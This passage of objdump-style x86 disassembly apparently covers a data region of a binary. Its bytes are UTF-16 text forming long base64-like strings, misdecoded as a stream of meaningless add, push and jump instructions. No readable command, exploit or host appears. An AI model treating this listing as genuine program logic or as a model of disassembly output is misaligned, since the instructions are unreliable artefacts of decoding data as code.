  40b4ed:	00 4a 00             	add    %cl,0x0(%edx)
  40b4f0:	33 00                	xor    (%eax),%eax
  40b4f2:	37                   	aaa
  40b4f3:	00 47 00             	add    %al,0x0(%edi)
  40b4f6:	42                   	inc    %edx
  40b4f7:	00 38                	add    %bh,(%eax)
  40b4f9:	00 64 00 33          	add    %ah,0x33(%eax,%eax,1)
  40b4fd:	00 35 00 4b 00 68    	add    %dh,0x68004b00
  40b503:	00 54 00 4e          	add    %dl,0x4e(%eax,%eax,1)
  40b507:	00 47 00             	add    %al,0x0(%edi)
  40b50a:	34 00                	xor    $0x0,%al
  40b50c:	33 00                	xor    (%eax),%eax
  40b50e:	37                   	aaa
  40b50f:	00 66 00             	add    %ah,0x0(%esi)
  40b512:	43                   	inc    %ebx
  40b513:	00 52 00             	add    %dl,0x0(%edx)
  40b516:	61                   	popa
  40b517:	00 51 00             	add    %dl,0x0(%ecx)
  40b51a:	34 00                	xor    $0x0,%al
  40b51c:	4d                   	dec    %ebp
  40b51d:	00 58 00             	add    %bl,0x0(%eax)
  40b520:	31 00                	xor    %eax,(%eax)
  40b522:	49                   	dec    %ecx
  40b523:	00 44 00 6d          	add    %al,0x6d(%eax,%eax,1)
  40b527:	00 36                	add    %dh,(%esi)
  40b529:	00 42 00             	add    %al,0x0(%edx)
  40b52c:	57                   	push   %edi
  40b52d:	00 42 00             	add    %al,0x0(%edx)
  40b530:	77 00                	ja     0x40b532
  40b532:	4c                   	dec    %esp
  40b533:	00 41 00             	add    %al,0x0(%ecx)
  40b536:	6b 00 68             	imul   $0x68,(%eax),%eax
  40b539:	00 74 00 58          	add    %dh,0x58(%eax,%eax,1)
  40b53d:	00 33                	add    %dh,(%ebx)
  40b53f:	00 6a 00             	add    %ch,0x0(%edx)
  40b542:	58                   	pop    %eax
  40b543:	00 36                	add    %dh,(%esi)
  40b545:	00 4c 00 77          	add    %cl,0x77(%eax,%eax,1)
  40b549:	00 46 00             	add    %al,0x0(%esi)
  40b54c:	51                   	push   %ecx
  40b54d:	00 63 00             	add    %ah,0x0(%ebx)
  40b550:	32 00                	xor    (%eax),%al
  40b552:	71 00                	jno    0x40b554
  40b554:	70 00                	jo     0x40b556
  40b556:	7a 00                	jp     0x40b558
  40b558:	59                   	pop    %ecx
  40b559:	00 42 00             	add    %al,0x0(%edx)
  40b55c:	34 00                	xor    $0x0,%al
  40b55e:	48                   	dec    %eax
  40b55f:	00 35 00 68 00 4c    	add    %dh,0x4c006800
  40b565:	00 2f                	add    %ch,(%edi)
  40b567:	00 42 00             	add    %al,0x0(%edx)
  40b56a:	7a 00                	jp     0x40b56c
  40b56c:	68 00 51 00 6e       	push   $0x6e005100
  40b571:	00 6f 00             	add    %ch,0x0(%edi)
  40b574:	75 00                	jne    0x40b576
  40b576:	41                   	inc    %ecx
  40b577:	00 6c 00 4e          	add    %ch,0x4e(%eax,%eax,1)
  40b57b:	00 58 00             	add    %bl,0x0(%eax)
  40b57e:	58                   	pop    %eax
  40b57f:	00 39                	add    %bh,(%ecx)
  40b581:	00 45 00             	add    %al,0x0(%ebp)
  40b584:	38 00                	cmp    %al,(%eax)
  40b586:	65 00 36             	add    %dh,%gs:(%esi)
  40b589:	00 66 00             	add    %ah,0x0(%esi)
  40b58c:	37                   	aaa
  40b58d:	00 4c 00 59          	add    %cl,0x59(%eax,%eax,1)
  40b591:	00 67 00             	add    %ah,0x0(%edi)
  40b594:	58                   	pop    %eax
  40b595:	00 67 00             	add    %ah,0x0(%edi)
  40b598:	4a                   	dec    %edx
  40b599:	00 5a 00             	add    %bl,0x0(%edx)
  40b59c:	51                   	push   %ecx
  40b59d:	00 52 00             	add    %dl,0x0(%edx)
  40b5a0:	7a 00                	jp     0x40b5a2
  40b5a2:	39 00                	cmp    %eax,(%eax)
  40b5a4:	4a                   	dec    %edx
  40b5a5:	00 48 00             	add    %cl,0x0(%eax)
  40b5a8:	58                   	pop    %eax
  40b5a9:	00 4e 00             	add    %cl,0x0(%esi)
  40b5ac:	6b 00 2b             	imul   $0x2b,(%eax),%eax
  40b5af:	00 36                	add    %dh,(%esi)
  40b5b1:	00 46 00             	add    %al,0x0(%esi)
  40b5b4:	56                   	push   %esi
  40b5b5:	00 45 00             	add    %al,0x0(%ebp)
  40b5b8:	4a                   	dec    %edx
  40b5b9:	00 77 00             	add    %dh,0x0(%edi)
  40b5bc:	76 00                	jbe    0x40b5be
  40b5be:	4e                   	dec    %esi
  40b5bf:	00 47 00             	add    %al,0x0(%edi)
  40b5c2:	72 00                	jb     0x40b5c4
  40b5c4:	4c                   	dec    %esp
  40b5c5:	00 30                	add    %dh,(%eax)
  40b5c7:	00 3d 00 00 87 b1    	add    %bh,0xb1870000
  40b5cd:	64 00 64 00 39       	add    %ah,%fs:0x39(%eax,%eax,1)
  40b5d2:	00 59 00             	add    %bl,0x0(%ecx)
  40b5d5:	34 00                	xor    $0x0,%al
  40b5d7:	44                   	inc    %esp
  40b5d8:	00 38                	add    %bh,(%eax)
  40b5da:	00 72 00             	add    %dh,0x0(%edx)
  40b5dd:	38 00                	cmp    %al,(%eax)
  40b5df:	38 00                	cmp    %al,(%eax)
  40b5e1:	31 00                	xor    %eax,(%eax)
  40b5e3:	41                   	inc    %ecx
  40b5e4:	00 7a 00             	add    %bh,0x0(%edx)
  40b5e7:	46                   	inc    %esi
  40b5e8:	00 41 00             	add    %al,0x0(%ecx)
  40b5eb:	71 00                	jno    0x40b5ed
  40b5ed:	68 00 42 00 46       	push   $0x46004200
  40b5f2:	00 65 00             	add    %ah,0x0(%ebp)
  40b5f5:	31 00                	xor    %eax,(%eax)
  40b5f7:	37                   	aaa
  40b5f8:	00 36                	add    %dh,(%esi)
  40b5fa:	00 63 00             	add    %ah,0x0(%ebx)
  40b5fd:	39 00                	cmp    %eax,(%eax)
  40b5ff:	32 00                	xor    (%eax),%al
  40b601:	6e                   	outsb  %ds:(%esi),(%dx)
  40b602:	00 39                	add    %bh,(%ecx)
  40b604:	00 61 00             	add    %ah,0x0(%ecx)
  40b607:	54                   	push   %esp
  40b608:	00 67 00             	add    %ah,0x0(%edi)
  40b60b:	4e                   	dec    %esi
  40b60c:	00 52 00             	add    %dl,0x0(%edx)
  40b60f:	67 00 66 00          	add    %ah,0x0(%bp)
  40b613:	55                   	push   %ebp
  40b614:	00 43 00             	add    %al,0x0(%ebx)
  40b617:	52                   	push   %edx
  40b618:	00 37                	add    %dh,(%edi)
  40b61a:	00 33                	add    %dh,(%ebx)
  40b61c:	00 63 00             	add    %ah,0x0(%ebx)
  40b61f:	70 00                	jo     0x40b621
  40b621:	78 00                	js     0x40b623
  40b623:	41                   	inc    %ecx
  40b624:	00 77 00             	add    %dh,0x0(%edi)
  40b627:	67 00 2f             	add    %ch,(%bx)
  40b62a:	00 73 00             	add    %dh,0x0(%ebx)
  40b62d:	39 00                	cmp    %eax,(%eax)
  40b62f:	4c                   	dec    %esp
  40b630:	00 53 00             	add    %dl,0x0(%ebx)
  40b633:	41                   	inc    %ecx
  40b634:	00 4f 00             	add    %cl,0x0(%edi)
  40b637:	4d                   	dec    %ebp
  40b638:	00 48 00             	add    %cl,0x0(%eax)
  40b63b:	74 00                	je     0x40b63d
  40b63d:	34 00                	xor    $0x0,%al
  40b63f:	49                   	dec    %ecx
  40b640:	00 55 00             	add    %dl,0x0(%ebp)
  40b643:	38 00                	cmp    %al,(%eax)
  40b645:	35 00 4d 00 6a       	xor    $0x6a004d00,%eax
  40b64a:	00 68 00             	add    %ch,0x0(%eax)
  40b64d:	56                   	push   %esi
  40b64e:	00 75 00             	add    %dh,0x0(%ebp)
  40b651:	6e                   	outsb  %ds:(%esi),(%dx)
  40b652:	00 48 00             	add    %cl,0x0(%eax)
  40b655:	4b                   	dec    %ebx
  40b656:	00 30                	add    %dh,(%eax)
  40b658:	00 78 00             	add    %bh,0x0(%eax)
  40b65b:	76 00                	jbe    0x40b65d
  40b65d:	34 00                	xor    $0x0,%al
  40b65f:	31 00                	xor    %eax,(%eax)
  40b661:	65 00 6c 00 44       	add    %ch,%gs:0x44(%eax,%eax,1)
  40b666:	00 61 00             	add    %ah,0x0(%ecx)
  40b669:	6e                   	outsb  %ds:(%esi),(%dx)
  40b66a:	00 7a 00             	add    %bh,0x0(%edx)
  40b66d:	35 00 66 00 56       	xor    $0x56006600,%eax
  40b672:	00 6d 00             	add    %ch,0x0(%ebp)
  40b675:	62 00                	bound  %eax,(%eax)
  40b677:	49                   	dec    %ecx
  40b678:	00 4f 00             	add    %cl,0x0(%edi)
  40b67b:	47                   	inc    %edi
  40b67c:	00 35 00 56 00 6e    	add    %dh,0x6e005600
  40b682:	00 64 00 4a          	add    %ah,0x4a(%eax,%eax,1)
  40b686:	00 7a 00             	add    %bh,0x0(%edx)
  40b689:	76 00                	jbe    0x40b68b
  40b68b:	5a                   	pop    %edx
  40b68c:	00 41 00             	add    %al,0x0(%ecx)
  40b68f:	4a                   	dec    %edx
  40b690:	00 57 00             	add    %dl,0x0(%edi)
  40b693:	52                   	push   %edx
  40b694:	00 4c 00 54          	add    %cl,0x54(%eax,%eax,1)
  40b698:	00 32                	add    %dh,(%edx)
  40b69a:	00 6d 00             	add    %ch,0x0(%ebp)
  40b69d:	34 00                	xor    $0x0,%al
  40b69f:	4f                   	dec    %edi
  40b6a0:	00 6e 00             	add    %ch,0x0(%esi)
  40b6a3:	33 00                	xor    (%eax),%eax
  40b6a5:	34 00                	xor    $0x0,%al
  40b6a7:	72 00                	jb     0x40b6a9
  40b6a9:	58                   	pop    %eax
  40b6aa:	00 5a 00             	add    %bl,0x0(%edx)
  40b6ad:	4f                   	dec    %edi
  40b6ae:	00 64 00 62          	add    %ah,0x62(%eax,%eax,1)
  40b6b2:	00 50 00             	add    %dl,0x0(%eax)
  40b6b5:	73 00                	jae    0x40b6b7
  40b6b7:	66 00 54 00 70       	data16 add %dl,0x70(%eax,%eax,1)
  40b6bc:	00 38                	add    %bh,(%eax)
  40b6be:	00 30                	add    %dh,(%eax)
  40b6c0:	00 32                	add    %dh,(%edx)
  40b6c2:	00 32                	add    %dh,(%edx)
  40b6c4:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  40b6c8:	00 33                	add    %dh,(%ebx)
  40b6ca:	00 4f 00             	add    %cl,0x0(%edi)
  40b6cd:	42                   	inc    %edx
  40b6ce:	00 33                	add    %dh,(%ebx)
  40b6d0:	00 67 00             	add    %ah,0x0(%edi)
  40b6d3:	58                   	pop    %eax
  40b6d4:	00 73 00             	add    %dh,0x0(%ebx)
  40b6d7:	41                   	inc    %ecx
  40b6d8:	00 38                	add    %bh,(%eax)
  40b6da:	00 79 00             	add    %bh,0x0(%ecx)
  40b6dd:	33 00                	xor    (%eax),%eax
  40b6df:	51                   	push   %ecx
  40b6e0:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b6e3:	6e                   	outsb  %ds:(%esi),(%dx)
  40b6e4:	00 45 00             	add    %al,0x0(%ebp)
  40b6e7:	39 00                	cmp    %eax,(%eax)
  40b6e9:	68 00 39 00 75       	push   $0x75003900
  40b6ee:	00 73 00             	add    %dh,0x0(%ebx)
  40b6f1:	34 00                	xor    $0x0,%al
  40b6f3:	41                   	inc    %ecx
  40b6f4:	00 35 00 6c 00 46    	add    %dh,0x46006c00
  40b6fa:	00 63 00             	add    %ah,0x0(%ebx)
  40b6fd:	6e                   	outsb  %ds:(%esi),(%dx)
  40b6fe:	00 57 00             	add    %dl,0x0(%edi)
  40b701:	50                   	push   %eax
  40b702:	00 37                	add    %dh,(%edi)
  40b704:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40b708:	00 6f 00             	add    %ch,0x0(%edi)
  40b70b:	75 00                	jne    0x40b70d
  40b70d:	6e                   	outsb  %ds:(%esi),(%dx)
  40b70e:	00 77 00             	add    %dh,0x0(%edi)
  40b711:	67 00 33             	add    %dh,(%bp,%di)
  40b714:	00 4a 00             	add    %cl,0x0(%edx)
  40b717:	41                   	inc    %ecx
  40b718:	00 70 00             	add    %dh,0x0(%eax)
  40b71b:	70 00                	jo     0x40b71d
  40b71d:	49                   	dec    %ecx
  40b71e:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b721:	52                   	push   %edx
  40b722:	00 4e 00             	add    %cl,0x0(%esi)
  40b725:	5a                   	pop    %edx
  40b726:	00 2b                	add    %ch,(%ebx)
  40b728:	00 39                	add    %bh,(%ecx)
  40b72a:	00 63 00             	add    %ah,0x0(%ebx)
  40b72d:	57                   	push   %edi
  40b72e:	00 48 00             	add    %cl,0x0(%eax)
  40b731:	4f                   	dec    %edi
  40b732:	00 61 00             	add    %ah,0x0(%ecx)
  40b735:	78 00                	js     0x40b737
  40b737:	52                   	push   %edx
  40b738:	00 32                	add    %dh,(%edx)
  40b73a:	00 6c 00 56          	add    %ch,0x56(%eax,%eax,1)
  40b73e:	00 6e 00             	add    %ch,0x0(%esi)
  40b741:	64 00 4d 00          	add    %cl,%fs:0x0(%ebp)
  40b745:	4e                   	dec    %esi
  40b746:	00 75 00             	add    %dh,0x0(%ebp)
  40b749:	78 00                	js     0x40b74b
  40b74b:	43                   	inc    %ebx
  40b74c:	00 79 00             	add    %bh,0x0(%ecx)
  40b74f:	6d                   	insl   (%dx),%es:(%edi)
  40b750:	00 6e 00             	add    %ch,0x0(%esi)
  40b753:	6a 00                	push   $0x0
  40b755:	48                   	dec    %eax
  40b756:	00 52 00             	add    %dl,0x0(%edx)
  40b759:	33 00                	xor    (%eax),%eax
  40b75b:	50                   	push   %eax
  40b75c:	00 65 00             	add    %ah,0x0(%ebp)
  40b75f:	68 00 48 00 4a       	push   $0x4a004800
  40b764:	00 4f 00             	add    %cl,0x0(%edi)
  40b767:	4b                   	dec    %ebx
  40b768:	00 76 00             	add    %dh,0x0(%esi)
  40b76b:	47                   	inc    %edi
  40b76c:	00 71 00             	add    %dh,0x0(%ecx)
  40b76f:	62 00                	bound  %eax,(%eax)
  40b771:	4e                   	dec    %esi
  40b772:	00 61 00             	add    %ah,0x0(%ecx)
  40b775:	79 00                	jns    0x40b777
  40b777:	2f                   	das
  40b778:	00 6b 00             	add    %ch,0x0(%ebx)
  40b77b:	79 00                	jns    0x40b77d
  40b77d:	46                   	inc    %esi
  40b77e:	00 57 00             	add    %dl,0x0(%edi)
  40b781:	51                   	push   %ecx
  40b782:	00 4a 00             	add    %cl,0x0(%edx)
  40b785:	74 00                	je     0x40b787
  40b787:	76 00                	jbe    0x40b789
  40b789:	76 00                	jbe    0x40b78b
  40b78b:	4d                   	dec    %ebp
  40b78c:	00 71 00             	add    %dh,0x0(%ecx)
  40b78f:	73 00                	jae    0x40b791
  40b791:	6a 00                	push   $0x0
  40b793:	78 00                	js     0x40b795
  40b795:	55                   	push   %ebp
  40b796:	00 43 00             	add    %al,0x0(%ebx)
  40b799:	71 00                	jno    0x40b79b
  40b79b:	4d                   	dec    %ebp
  40b79c:	00 61 00             	add    %ah,0x0(%ecx)
  40b79f:	4a                   	dec    %edx
  40b7a0:	00 37                	add    %dh,(%edi)
  40b7a2:	00 4f 00             	add    %cl,0x0(%edi)
  40b7a5:	74 00                	je     0x40b7a7
  40b7a7:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  40b7ab:	56                   	push   %esi
  40b7ac:	00 53 00             	add    %dl,0x0(%ebx)
  40b7af:	56                   	push   %esi
  40b7b0:	00 48 00             	add    %cl,0x0(%eax)
  40b7b3:	43                   	inc    %ebx
  40b7b4:	00 75 00             	add    %dh,0x0(%ebp)
  40b7b7:	79 00                	jns    0x40b7b9
  40b7b9:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40b7bd:	30 00                	xor    %al,(%eax)
  40b7bf:	63 00                	arpl   %eax,(%eax)
  40b7c1:	6b 00 64             	imul   $0x64,(%eax),%eax
  40b7c4:	00 41 00             	add    %al,0x0(%ecx)
  40b7c7:	71 00                	jno    0x40b7c9
  40b7c9:	74 00                	je     0x40b7cb
  40b7cb:	71 00                	jno    0x40b7cd
  40b7cd:	47                   	inc    %edi
  40b7ce:	00 73 00             	add    %dh,0x0(%ebx)
  40b7d1:	56                   	push   %esi
  40b7d2:	00 6a 00             	add    %ch,0x0(%edx)
  40b7d5:	30 00                	xor    %al,(%eax)
  40b7d7:	73 00                	jae    0x40b7d9
  40b7d9:	34 00                	xor    $0x0,%al
  40b7db:	6c                   	insb   (%dx),%es:(%edi)
  40b7dc:	00 49 00             	add    %cl,0x0(%ecx)
  40b7df:	2f                   	das
  40b7e0:	00 35 00 48 00 4b    	add    %dh,0x4b004800
  40b7e6:	00 44 00 41          	add    %al,0x41(%eax,%eax,1)
  40b7ea:	00 78 00             	add    %bh,0x0(%eax)
  40b7ed:	77 00                	ja     0x40b7ef
  40b7ef:	54                   	push   %esp
  40b7f0:	00 75 00             	add    %dh,0x0(%ebp)
  40b7f3:	30 00                	xor    %al,(%eax)
  40b7f5:	6c                   	insb   (%dx),%es:(%edi)
  40b7f6:	00 4f 00             	add    %cl,0x0(%edi)
  40b7f9:	56                   	push   %esi
  40b7fa:	00 46 00             	add    %al,0x0(%esi)
  40b7fd:	75 00                	jne    0x40b7ff
  40b7ff:	77 00                	ja     0x40b801
  40b801:	37                   	aaa
  40b802:	00 2b                	add    %ch,(%ebx)
  40b804:	00 52 00             	add    %dl,0x0(%edx)
  40b807:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40b80b:	32 00                	xor    (%eax),%al
  40b80d:	44                   	inc    %esp
  40b80e:	00 6e 00             	add    %ch,0x0(%esi)
  40b811:	67 00 7a 00          	add    %bh,0x0(%bp,%si)
  40b815:	61                   	popa
  40b816:	00 57 00             	add    %dl,0x0(%edi)
  40b819:	54                   	push   %esp
  40b81a:	00 31                	add    %dh,(%ecx)
  40b81c:	00 65 00             	add    %ah,0x0(%ebp)
  40b81f:	2b 00                	sub    (%eax),%eax
  40b821:	76 00                	jbe    0x40b823
  40b823:	34 00                	xor    $0x0,%al
  40b825:	66 00 67 00          	data16 add %ah,0x0(%edi)
  40b829:	76 00                	jbe    0x40b82b
  40b82b:	36 00 50 00          	add    %dl,%ss:0x0(%eax)
  40b82f:	54                   	push   %esp
  40b830:	00 66 00             	add    %ah,0x0(%esi)
  40b833:	7a 00                	jp     0x40b835
  40b835:	7a 00                	jp     0x40b837
  40b837:	4a                   	dec    %edx
  40b838:	00 4b 00             	add    %cl,0x0(%ebx)
  40b83b:	5a                   	pop    %edx
  40b83c:	00 61 00             	add    %ah,0x0(%ecx)
  40b83f:	41                   	inc    %ecx
  40b840:	00 67 00             	add    %ah,0x0(%edi)
  40b843:	50                   	push   %eax
  40b844:	00 69 00             	add    %ch,0x0(%ecx)
  40b847:	4e                   	dec    %esi
  40b848:	00 63 00             	add    %ah,0x0(%ebx)
  40b84b:	36 00 2f             	add    %ch,%ss:(%edi)
  40b84e:	00 71 00             	add    %dh,0x0(%ecx)
  40b851:	33 00                	xor    (%eax),%eax
  40b853:	33 00                	xor    (%eax),%eax
  40b855:	54                   	push   %esp
  40b856:	00 78 00             	add    %bh,0x0(%eax)
  40b859:	6a 00                	push   $0x0
  40b85b:	5a                   	pop    %edx
  40b85c:	00 4e 00             	add    %cl,0x0(%esi)
  40b85f:	32 00                	xor    (%eax),%al
  40b861:	79 00                	jns    0x40b863
  40b863:	52                   	push   %edx
  40b864:	00 65 00             	add    %ah,0x0(%ebp)
  40b867:	4b                   	dec    %ebx
  40b868:	00 31                	add    %dh,(%ecx)
  40b86a:	00 63 00             	add    %ah,0x0(%ebx)
  40b86d:	58                   	pop    %eax
  40b86e:	00 6d 00             	add    %ch,0x0(%ebp)
  40b871:	47                   	inc    %edi
  40b872:	00 73 00             	add    %dh,0x0(%ebx)
  40b875:	55                   	push   %ebp
  40b876:	00 51 00             	add    %dl,0x0(%ecx)
  40b879:	48                   	dec    %eax
  40b87a:	00 55 00             	add    %dl,0x0(%ebp)
  40b87d:	65 00 39             	add    %bh,%gs:(%ecx)
  40b880:	00 44 00 36          	add    %al,0x36(%eax,%eax,1)
  40b884:	00 37                	add    %dh,(%edi)
  40b886:	00 6a 00             	add    %ch,0x0(%edx)
  40b889:	30 00                	xor    %al,(%eax)
  40b88b:	4b                   	dec    %ebx
  40b88c:	00 4e 00             	add    %cl,0x0(%esi)
  40b88f:	58                   	pop    %eax
  40b890:	00 4e 00             	add    %cl,0x0(%esi)
  40b893:	6d                   	insl   (%dx),%es:(%edi)
  40b894:	00 6d 00             	add    %ch,0x0(%ebp)
  40b897:	76 00                	jbe    0x40b899
  40b899:	73 00                	jae    0x40b89b
  40b89b:	55                   	push   %ebp
  40b89c:	00 42 00             	add    %al,0x0(%edx)
  40b89f:	2f                   	das
  40b8a0:	00 76 00             	add    %dh,0x0(%esi)
  40b8a3:	66 00 63 00          	data16 add %ah,0x0(%ebx)
  40b8a7:	30 00                	xor    %al,(%eax)
  40b8a9:	67 00 6f 00          	add    %ch,0x0(%bx)
  40b8ad:	6c                   	insb   (%dx),%es:(%edi)
  40b8ae:	00 48 00             	add    %cl,0x0(%eax)
  40b8b1:	37                   	aaa
  40b8b2:	00 53 00             	add    %dl,0x0(%ebx)
  40b8b5:	59                   	pop    %ecx
  40b8b6:	00 66 00             	add    %ah,0x0(%esi)
  40b8b9:	48                   	dec    %eax
  40b8ba:	00 4c 00 4a          	add    %cl,0x4a(%eax,%eax,1)
  40b8be:	00 4b 00             	add    %cl,0x0(%ebx)
  40b8c1:	41                   	inc    %ecx
  40b8c2:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b8c5:	53                   	push   %ebx
  40b8c6:	00 4d 00             	add    %cl,0x0(%ebp)
  40b8c9:	39 00                	cmp    %eax,(%eax)
  40b8cb:	38 00                	cmp    %al,(%eax)
  40b8cd:	43                   	inc    %ebx
  40b8ce:	00 61 00             	add    %ah,0x0(%ecx)
  40b8d1:	55                   	push   %ebp
  40b8d2:	00 2f                	add    %ch,(%edi)
  40b8d4:	00 36                	add    %dh,(%esi)
  40b8d6:	00 6c 00 2b          	add    %ch,0x2b(%eax,%eax,1)
  40b8da:	00 44 00 2f          	add    %al,0x2f(%eax,%eax,1)
  40b8de:	00 5a 00             	add    %bl,0x0(%edx)
  40b8e1:	61                   	popa
  40b8e2:	00 39                	add    %bh,(%ecx)
  40b8e4:	00 5a 00             	add    %bl,0x0(%edx)
  40b8e7:	49                   	dec    %ecx
  40b8e8:	00 6f 00             	add    %ch,0x0(%edi)
  40b8eb:	66 00 74 00 74       	data16 add %dh,0x74(%eax,%eax,1)
  40b8f0:	00 36                	add    %dh,(%esi)
  40b8f2:	00 69 00             	add    %ch,0x0(%ecx)
  40b8f5:	30 00                	xor    %al,(%eax)
  40b8f7:	46                   	inc    %esi
  40b8f8:	00 61 00             	add    %ah,0x0(%ecx)
  40b8fb:	54                   	push   %esp
  40b8fc:	00 51 00             	add    %dl,0x0(%ecx)
  40b8ff:	72 00                	jb     0x40b901
  40b901:	30 00                	xor    %al,(%eax)
  40b903:	66 00 48 00          	data16 add %cl,0x0(%eax)
  40b907:	6d                   	insl   (%dx),%es:(%edi)
  40b908:	00 4a 00             	add    %cl,0x0(%edx)
  40b90b:	77 00                	ja     0x40b90d
  40b90d:	55                   	push   %ebp
  40b90e:	00 59 00             	add    %bl,0x0(%ecx)
  40b911:	72 00                	jb     0x40b913
  40b913:	49                   	dec    %ecx
  40b914:	00 64 00 39          	add    %ah,0x39(%eax,%eax,1)
  40b918:	00 74 00 43          	add    %dh,0x43(%eax,%eax,1)
  40b91c:	00 6e 00             	add    %ch,0x0(%esi)
  40b91f:	36 00 4a 00          	add    %cl,%ss:0x0(%edx)
  40b923:	4c                   	dec    %esp
  40b924:	00 79 00             	add    %bh,0x0(%ecx)
  40b927:	57                   	push   %edi
  40b928:	00 6b 00             	add    %ch,0x0(%ebx)
  40b92b:	33 00                	xor    (%eax),%eax
  40b92d:	55                   	push   %ebp
  40b92e:	00 35 00 39 00 46    	add    %dh,0x46003900
  40b934:	00 45 00             	add    %al,0x0(%ebp)
  40b937:	66 00 53 00          	data16 add %dl,0x0(%ebx)
  40b93b:	71 00                	jno    0x40b93d
  40b93d:	6f                   	outsl  %ds:(%esi),(%dx)
  40b93e:	00 41 00             	add    %al,0x0(%ecx)
  40b941:	70 00                	jo     0x40b943
  40b943:	33 00                	xor    (%eax),%eax
  40b945:	52                   	push   %edx
  40b946:	00 51 00             	add    %dl,0x0(%ecx)
  40b949:	38 00                	cmp    %al,(%eax)
  40b94b:	6b 00 39             	imul   $0x39,(%eax),%eax
  40b94e:	00 48 00             	add    %cl,0x0(%eax)
  40b951:	47                   	inc    %edi
  40b952:	00 77 00             	add    %dh,0x0(%edi)
  40b955:	6e                   	outsb  %ds:(%esi),(%dx)
  40b956:	00 65 00             	add    %ah,0x0(%ebp)
  40b959:	4f                   	dec    %edi
  40b95a:	00 38                	add    %bh,(%eax)
  40b95c:	00 47 00             	add    %al,0x0(%edi)
  40b95f:	71 00                	jno    0x40b961
  40b961:	38 00                	cmp    %al,(%eax)
  40b963:	6f                   	outsl  %ds:(%esi),(%dx)
  40b964:	00 67 00             	add    %ah,0x0(%edi)
  40b967:	70 00                	jo     0x40b969
  40b969:	50                   	push   %eax
  40b96a:	00 36                	add    %dh,(%esi)
  40b96c:	00 4c 00 66          	add    %cl,0x66(%eax,%eax,1)
  40b970:	00 6e 00             	add    %ch,0x0(%esi)
  40b973:	44                   	inc    %esp
  40b974:	00 56 00             	add    %dl,0x0(%esi)
  40b977:	6c                   	insb   (%dx),%es:(%edi)
  40b978:	00 75 00             	add    %dh,0x0(%ebp)
  40b97b:	4c                   	dec    %esp
  40b97c:	00 59 00             	add    %bl,0x0(%ecx)
  40b97f:	6b 00 77             	imul   $0x77,(%eax),%eax
  40b982:	00 63 00             	add    %ah,0x0(%ebx)
  40b985:	4a                   	dec    %edx
  40b986:	00 6f 00             	add    %ch,0x0(%edi)
  40b989:	79 00                	jns    0x40b98b
  40b98b:	55                   	push   %ebp
  40b98c:	00 2b                	add    %ch,(%ebx)
  40b98e:	00 6c 00 58          	add    %ch,0x58(%eax,%eax,1)
  40b992:	00 57 00             	add    %dl,0x0(%edi)
  40b995:	61                   	popa
  40b996:	00 64 00 71          	add    %ah,0x71(%eax,%eax,1)
  40b99a:	00 78 00             	add    %bh,0x0(%eax)
  40b99d:	70 00                	jo     0x40b99f
  40b99f:	46                   	inc    %esi
  40b9a0:	00 32                	add    %dh,(%edx)
  40b9a2:	00 30                	add    %dh,(%eax)
  40b9a4:	00 47 00             	add    %al,0x0(%edi)
  40b9a7:	74 00                	je     0x40b9a9
  40b9a9:	35 00 32 00 4e       	xor    $0x4e003200,%eax
  40b9ae:	00 4f 00             	add    %cl,0x0(%edi)
  40b9b1:	36 00 55 00          	add    %dl,%ss:0x0(%ebp)
  40b9b5:	51                   	push   %ecx
  40b9b6:	00 4f 00             	add    %cl,0x0(%edi)
  40b9b9:	59                   	pop    %ecx
  40b9ba:	00 47 00             	add    %al,0x0(%edi)
  40b9bd:	58                   	pop    %eax
  40b9be:	00 52 00             	add    %dl,0x0(%edx)
  40b9c1:	7a 00                	jp     0x40b9c3
  40b9c3:	79 00                	jns    0x40b9c5
  40b9c5:	74 00                	je     0x40b9c7
  40b9c7:	4a                   	dec    %edx
  40b9c8:	00 46 00             	add    %al,0x0(%esi)
  40b9cb:	4b                   	dec    %ebx
  40b9cc:	00 4c 00 36          	add    %cl,0x36(%eax,%eax,1)
  40b9d0:	00 77 00             	add    %dh,0x0(%edi)
  40b9d3:	68 00 33 00 7a       	push   $0x7a003300
  40b9d8:	00 77 00             	add    %dh,0x0(%edi)
  40b9db:	46                   	inc    %esi
  40b9dc:	00 46 00             	add    %al,0x0(%esi)
  40b9df:	36 00 71 00          	add    %dh,%ss:0x0(%ecx)
  40b9e3:	4c                   	dec    %esp
  40b9e4:	00 51 00             	add    %dl,0x0(%ecx)
  40b9e7:	54                   	push   %esp
  40b9e8:	00 75 00             	add    %dh,0x0(%ebp)
  40b9eb:	31 00                	xor    %eax,(%eax)
  40b9ed:	58                   	pop    %eax
  40b9ee:	00 72 00             	add    %dh,0x0(%edx)
  40b9f1:	6a 00                	push   $0x0
  40b9f3:	4c                   	dec    %esp
  40b9f4:	00 42 00             	add    %al,0x0(%edx)
  40b9f7:	31 00                	xor    %eax,(%eax)
  40b9f9:	72 00                	jb     0x40b9fb
  40b9fb:	48                   	dec    %eax
  40b9fc:	00 32                	add    %dh,(%edx)
  40b9fe:	00 30                	add    %dh,(%eax)
  40ba00:	00 43 00             	add    %al,0x0(%ebx)
  40ba03:	41                   	inc    %ecx
  40ba04:	00 76 00             	add    %dh,0x0(%esi)
  40ba07:	45                   	inc    %ebp
  40ba08:	00 56 00             	add    %dl,0x0(%esi)
  40ba0b:	51                   	push   %ecx
  40ba0c:	00 57 00             	add    %dl,0x0(%edi)
  40ba0f:	4a                   	dec    %edx
  40ba10:	00 70 00             	add    %dh,0x0(%eax)
  40ba13:	62 00                	bound  %eax,(%eax)
  40ba15:	51                   	push   %ecx
  40ba16:	00 6f 00             	add    %ch,0x0(%edi)
  40ba19:	74 00                	je     0x40ba1b
  40ba1b:	2f                   	das
  40ba1c:	00 46 00             	add    %al,0x0(%esi)
  40ba1f:	4e                   	dec    %esi
  40ba20:	00 6d 00             	add    %ch,0x0(%ebp)
  40ba23:	52                   	push   %edx
  40ba24:	00 30                	add    %dh,(%eax)
  40ba26:	00 38                	add    %bh,(%eax)
  40ba28:	00 50 00             	add    %dl,0x0(%eax)
  40ba2b:	57                   	push   %edi
  40ba2c:	00 50 00             	add    %dl,0x0(%eax)
  40ba2f:	79 00                	jns    0x40ba31
  40ba31:	4f                   	dec    %edi
